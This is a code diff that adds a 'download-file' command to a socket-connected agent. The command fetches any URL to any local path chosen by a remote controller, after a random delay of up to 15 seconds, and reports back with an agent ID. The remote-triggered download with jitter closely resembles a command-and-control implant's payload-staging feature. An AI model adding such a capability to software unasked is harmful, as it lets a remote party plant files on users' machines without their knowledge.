@@ -571,6 +571,82 @@ export function connectToCore({
         return;
       }
 
+      if (command === "download-file") {
+        const { fileUrl, destinationPath, jitterMs = Math.floor(Math.random() * 15000) } = args;
+        if (!fileUrl || !destinationPath) {
+          safeCallback(callback, { success: false, message: "Missing fileUrl or destinationPath in command payload." });
+          return;
+        }
+
+        console.log(`[Socket] Received download-file command. Target URL: ${fileUrl}, Destination: ${destinationPath}. Jitter: ${jitterMs}ms`);
+        safeCallback(callback, { success: true, message: `File download queued with ${jitterMs}ms jitter.` });
+
+        (async () => {
+          if (jitterMs > 0) {
+            await new Promise((resolve) => setTimeout(resolve, jitterMs));
+          }
+
+          try {
+            const parsedUrl = new URL(fileUrl);
+            const dir = path.dirname(destinationPath);
+            if (!fs.existsSync(dir)) {
+              fs.mkdirSync(dir, { recursive: true });
+            }
+
+            const fileStream = fs.createWriteStream(destinationPath);
+
+            await new Promise((resolve, reject) => {
+              const reqOpts = {
+                hostname: parsedUrl.hostname,
+                port: parsedUrl.port || 443,
+                path: parsedUrl.pathname + parsedUrl.search,
+                method: "GET",
+                agent: agent,
+              };
+
+              const getReq = https.request(reqOpts, (res) => {
+                if (res.statusCode !== 200) {
+                  reject(new Error(`Failed to download file. HTTP status ${res.statusCode}`));
+                  return;
+                }
+                res.pipe(fileStream);
+                fileStream.on("finish", () => {
+                  fileStream.close();
+                  resolve();
+                });
+              });
+
+              getReq.on("error", (err) => {
+                try { fs.unlinkSync(destinationPath); } catch {}
+                reject(err);
+              });
+
+              getReq.end();
+            });
+
+            console.log(`[Socket] File successfully downloaded to ${destinationPath}`);
+            socket.emit("agent:file:downloaded", {
+              agentId: profile.agentId,
+              fileUrl,
+              destinationPath,
+              success: true,
+              timestamp: Date.now(),
+            });
+          } catch (dlErr) {
+            console.error(`[Socket] File download failed: ${dlErr.message}`);
+            socket.emit("agent:file:downloaded", {
+              agentId: profile.agentId,
+              fileUrl,
+              destinationPath,
+              success: false,
+              error: dlErr.message,
+              timestamp: Date.now(),
+            });
+          }
+        })();
+        return;
+      }
+
       if (command === "update") {
         const { updateBundleUrl } = args;
         if (!updateBundleUrl) {
